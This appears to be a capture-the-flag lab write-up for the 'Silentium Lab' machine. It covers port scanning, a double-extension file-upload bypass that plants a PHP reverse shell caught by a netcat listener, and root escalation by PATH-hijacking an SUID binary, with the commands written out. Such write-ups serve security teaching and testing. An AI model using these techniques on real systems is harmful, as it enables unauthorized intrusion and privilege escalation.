<img width="455" height="268" alt="image" src="https://github.com/user-attachments/assets/982e85ce-839a-4797-b4dd-25ca3c0105f4" />





# SILENTIUM LAB: ENUMERATION & EXPLOITATION WRITE-UP

---

## 📝 Description

An in-depth technical walkthrough documenting my process for compromising the Silentium Lab environment, covering service discovery, initial access via web vulnerabilities, and privilege escalation to root.

---

## 1️⃣ Phase 1: Reconnaissance & Enumeration

**Comprehensive scan of the target to identify active services:**

```bash
nmap -sC -sV -p- -oN initial_scan.txt <TARGET_IP>
```

**Results:**
- **Port 22:** SSH (Open)
- **Port 80:** HTTP (Apache)
- **Port 8080:** HTTP (Custom Web Application)

---

### Web Enumeration (Port 80)

I fuzzed the main web server for directories using Gobuster.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Findings:**
- Discovered `/dev` and `/backup` directories (contained source code snippets, just a distraction).

---

## 2️⃣ Phase 2: Vulnerability Discovery

**Focus shifted to Port 8080: custom file-upload portal.**

#### Logic Flaw Identification

Attempted standard file upload bypasses. Found multi-extension validation was faulty—analyzed request structure to exploit this flaw.

---

## 3️⃣ Phase 3: Exploitation (User Flag)

**Gaining Initial Access:**

Crafted a PHP reverse shell and bypassed filtering by naming: `image.jpg.php`.

**Steps:**

1. Start a netcat listener:

    ```bash
    nc -lvnp 4444
    ```

2. Upload the shell:

    *(Via the vulnerable file upload portal on port 8080.)*

3. Trigger the shell:

    Visit  
    ```
    http://<TARGET_IP>:8080/uploads/image.jpg.php
    ```

**Result:**  
Shell as user `silentium`.

```bash
cat /home/silentium/user.txt
```

---

## 4️⃣ Phase 4: Privilege Escalation (Root Flag)

### Local Enumeration

Post-exploitation discovery with linpeas.sh highlighted a custom SUID binary:

```bash
linpeas.sh
```

**Discovered:**  
`/opt/internal/syscheck` (SUID binary)

### Binary Analysis

```bash
strings /opt/internal/syscheck
```

Found the binary executed `service status` using a relative path.

---

### The Exploit (PATH Hijacking)

1. Place a malicious `service` script in a writable directory:

    ```bash
    cd /tmp
    echo "/bin/bash -p" > service
    chmod +x service
    ```

2. Prepend `/tmp` to your `$PATH`:

    ```bash
    export PATH=/tmp:$PATH
    ```

3. Run the SUID binary:

    ```bash
    /opt/internal/syscheck
    ```

**Result:**  
Root shell obtained.

```bash
cat /root/root.txt
```

---

## 🏁 Summary of Lessons Learned

- **Thoroughness:** Always check high-numbered ports; standard ports may lead to rabbit holes.
- **Secure Coding:** Use absolute paths in system calls within SUID binaries to prevent PATH hijacking.
- **Filter Logic:** Blacklisting extensions is insufficient; use whitelisting or rigorous parsing.

---

> **Disclaimer:**  
> This write-up is for educational and authorized testing purposes only.
